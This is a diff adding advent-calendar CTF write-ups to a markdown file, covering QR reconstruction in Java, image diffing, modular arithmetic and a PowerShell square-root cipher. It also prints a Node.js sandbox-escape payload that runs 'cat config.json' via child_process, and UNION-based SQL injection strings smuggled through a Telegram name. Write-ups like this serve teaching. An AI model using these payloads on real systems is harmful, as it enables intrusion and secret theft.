@@ -262,7 +262,7 @@ In this challenge we get a sequence of numbers:
 132 114 107 105 101 75 75 75 75 75 75
 ```
 
-The `75`s at the end could be equal signs of a base64 encoding. When checking an ascii table we can see that `75` is the
+The `75`s at the end could be equal signs of a base64 encoding. When checking an ASCII table we can see that `75` is the
 octal representation of =. Decoding the numbers gives us:
 
 ```
@@ -346,3 +346,237 @@ The code seems to use the variable $x for the height and $dx for the change in h
 important: `(abs($x-$h)<6)`. It checks if x is in the interval [h - 6; h + 6]. This is the collision detection of the
 game. If we change the 6 to a higher number we can fly through the walls.
 
+## Medium
+
+### Day 08: Advent Snail
+
+In this challenge we get a scrambled picture and we have to reverse it to get a valid QR code. The name of the challenge
+hints at a spiral pattern. After trying to read the pixels from the upper left corner I tried to read them from the
+center. This worked quite well.
+
+```java
+private static boolean[][] loadPixelsFromImage(File file) throws IOException {
+    BufferedImage image = ImageIO.read(file);
+    boolean[][] colours = new boolean[25][25];
+
+    for (int x = 0; x < 25; x++) {
+        for (int y = 0; y < 25; y++) {
+            int colour = image.getRGB(x, y);
+
+            if (colour == -14803426) {
+                colours[x][y] = true; // black pixel
+            } else if (colour == -263173) {
+                colours[x][y] = false; // white pixel
+            } else {
+                throw new IllegalArgumentException("Unknown colour at position (" + x + ", " + y + ")");
+            }
+        }
+    }
+
+    return colours;
+}
+
+private static List<Point> generateSnailPattern() {
+    List<Point> points = new ArrayList<>();
+    int x = 12, y = 12;
+    int distance = 1;
+    
+    points.add(new Point(x, y));
+
+    while (distance != 27) {
+        for (int i = 0; i < distance; i++) {
+            y--;
+            points.add(new Point(x, y));
+        }
+
+        for (int i = 0; i < distance; i++) {
+            x++;
+            points.add(new Point(x, y));
+        }
+
+        distance++;
+
+        for (int i = 0; i < distance; i++) {
+            y++;
+            points.add(new Point(x, y));
+        }
+
+        for (int i = 0; i < distance; i++) {
+            x--;
+            points.add(new Point(x, y));
+        }
+
+        distance++;
+    }
+
+    // Remove superfluous points
+    points.removeIf(p -> p.x < 0 || p.y < 0 || p.x > 24 || p.y > 24);
+
+    return points;
+}
+
+private static void reassemble(List<Point> order, boolean[][] colors) throws IOException {
+    BufferedImage b = new BufferedImage(25, 25, BufferedImage.TYPE_INT_RGB);
+    int x = 0, y = 0;
+
+    while (!order.isEmpty()) {
+        Point pos = order.remove(0);
+        b.setRGB(x, y, colors[pos.x][pos.y] ? 0 : 16777215);
+
+        if (++x == 25) {
+            x = 0;
+            y++;
+        }
+    }
+
+    ImageIO.write(b, "png", new File("unsnailed.png"));
+}
+
+public static void main(String[] args) throws IOException {
+    reassemble(generateSnailPattern(), loadPixelsFromImage(new File("snail.png")));
+}
+```
+
+### Day 09: fake xmass balls
+
+The challenge descriptions says that we should compare the fake xmass ball with a real one. If we diff the images we get
+a QR code.
+
+```
+compare real.png fake.png -compose src diff.png
+```
+
+### Day 10: >_ Run, Node, Run
+
+In this challenge we can run JavaScript in a sandbox environment. The NodeJS server uses the following code:
+
+```javascript
+const {flag, port} = require("./config.json");
+const sandbox = require("sandbox");
+const app = require("express")();
+
+app.use(require('body-parser').urlencoded({ extended: false }));
+
+app.get("/", (req, res) => res.sendFile(__dirname+"/index.html"));
+app.get("/code", (req, res) => res.sendFile(__filename));
+
+app.post("/run", (req, res) => {
+
+	if (!req.body.run) {
+		res.json({success: false, result: "No code provided"});
+		return;
+	}
+
+	let boiler = "const flag_" + require("randomstring").generate(64) + "=\"" + flag + "\";\n";
+
+	new sandbox().run(boiler + req.body.run, (out) => res.json({success: true, result: out.result}));
+
+});
+
+app.listen(port);
+```
+
+The goal is to read the contents of the `config.json`. We won't be able to find the correct variable name because of the
+randomstring part. So we have to break out of this sandbox. We can check the GitHub Issues if there's a way to
+accomplish this. And of course [there's a way](https://github.com/gf3/sandbox/issues/50). Now we just have to craft a
+malicious input:
+
+```javascript
+new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("child_process").execSync("cat config.json")
+```
+
+### Day 10: Crypt-o-Math 3.0
+
+We get the following formulas and values:
+
+```
+c = (a * b) % p
+c = 0x7E65D68F84862CEA3FCC15B966767CCAED530B87FC4061517A1497A03D2
+p = 0xDD8E05FF296C792D2855DB6B5331AF9D112876B41D43F73CEF3AC7425F9
+b = 0x7BBE3A50F28B2BA511A860A0A32AD71D4B5B93A8AE295E83350E68B57E5
+```
+
+We have to find a. I remembered reading about this in last years writeup.
+To solve the equation we can rewrite it:
+
+`c * b^-1 % p = a`
+
+The following Java code solves the equation:
+
+```java
+BigInteger c = new BigInteger("7E65D68F84862CEA3FCC15B966767CCAED530B87FC4061517A1497A03D2", 16);
+BigInteger p = new BigInteger("DD8E05FF296C792D2855DB6B5331AF9D112876B41D43F73CEF3AC7425F9", 16);
+BigInteger b = new BigInteger("7BBE3A50F28B2BA511A860A0A32AD71D4B5B93A8AE295E83350E68B57E5",16);
+
+BigInteger bInverse = b.modInverse(p);
+BigInteger a = c.multiply(bInverse).mod(p);
+```
+
+This a doesn't give a valid flag when decoding it to ASCII. So I assumed that we have to take a different solution for
+a. I wrote a program that gets me other valid solutions for a and checked if they start with HV
+
+```java
+BigInteger c = new BigInteger("7E65D68F84862CEA3FCC15B966767CCAED530B87FC4061517A1497A03D2", 16);
+BigInteger p = new BigInteger("DD8E05FF296C792D2855DB6B5331AF9D112876B41D43F73CEF3AC7425F9", 16);
+BigInteger b = new BigInteger("7BBE3A50F28B2BA511A860A0A32AD71D4B5B93A8AE295E83350E68B57E5",16);
+
+BigInteger bInverse = b.modInverse(p);
+BigInteger a = c.multiply(bInverse).mod(p);
+
+int i = 1;
+while (true) {
+    BigInteger current = new BigInteger(a.toString());
+
+    for (int j = 0; j < i; j++)  {
+        current = current.add(p);
+    }
+
+    if (current.toString(16).startsWith("4856")) {
+        System.out.println(current.toString(16));
+        return;
+    }
+
+    i++;
+}
+```
+
+After 1337 iterations I found a new solution which was the correct flag.
+
+### Day 12: SmartWishList
+
+For this challenge we get a Telegram bot. We can add wishes and show our current wish list. When adding wishes with to
+many characters we get an SQL error. So it was obvious that we have to do an SQL injection. After some trial and error I
+realized that it's possible to inject SQL by changing the first/lastname in Telegram.
+Changing the name to `'UNION SELECT table_name, 1 FROM information_schema.tables #` revealed the `SecretStore` table.
+Now we can just select the flag from this table by changing the name to `'UNION SELECT flag, 1 FROM SecretStore #`.
+
+![](/images/telegram.png)
+
+
+### Day 13: flappy's revenge
+
+This time flappy bird runs on a server and we can't ignore collisions that easily. I tried solving it by sending the
+correct amount of spacebar presses to the server. This didn't really work so I solved it by playing it.
+
+### Day 14: power in the shell
+
+We get this powershell script and the encrypt flag `2A4C9AA52257B56837369D5DD7019451C0EC04427EB95EB741D0273D55`:
+
+```powershell
+. "$PSScriptRoot\flag.ps1" #thumbprint 1398ED7F59A62962D5A47DD0D32B71156DD6AF6B46BEA949976331B8E1
+
+if ($PSVersionTable.PSVersion.Major -gt 2)
+{
+    $m = [System.Numerics.BigInteger]::Parse($flag, 'AllowHexSpecifier');
+    $n = [System.Numerics.BigInteger]::Parse("0D8A7A45D9BE42BB3F03F710CF105628E8080F6105224612481908DC721", 'AllowHexSpecifier');
+    $c = [System.Numerics.BigInteger]::ModPow($m, 1+1, $n)
+    write-host "encrypted flag:" $c.ToString("X");
+}
+```
+
+We can write this as an equation `encrypted_flag = m^2 % n`. Now we have to find m. Using the [quadratic modular
+equation solver](https://www.alpertron.com.ar/QUADMOD.HTM) this equation can be solved easily.
+
+![](images/powershell.png)
+
+The third solution gives us the correct flag when decoded to ASCII.
